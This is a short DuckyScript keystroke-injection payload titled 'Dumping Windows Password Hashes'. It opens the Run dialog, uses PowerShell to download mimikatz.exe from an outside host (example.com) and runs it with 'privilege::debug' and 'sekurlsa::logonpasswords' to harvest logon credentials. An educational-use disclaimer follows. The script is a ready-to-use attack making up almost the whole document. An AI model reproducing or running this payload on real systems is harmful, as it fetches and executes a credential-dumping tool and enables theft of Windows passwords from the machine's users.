# Dumping Windows Password Hashes

Downloads and runs Mimikatz to dump Windows password hashes.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "Invoke-WebRequest -Uri 'http://example.com/mimikatz.exe' -OutFile 'C:\\mimikatz.exe'"
ENTER
DELAY 500
STRING C:\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.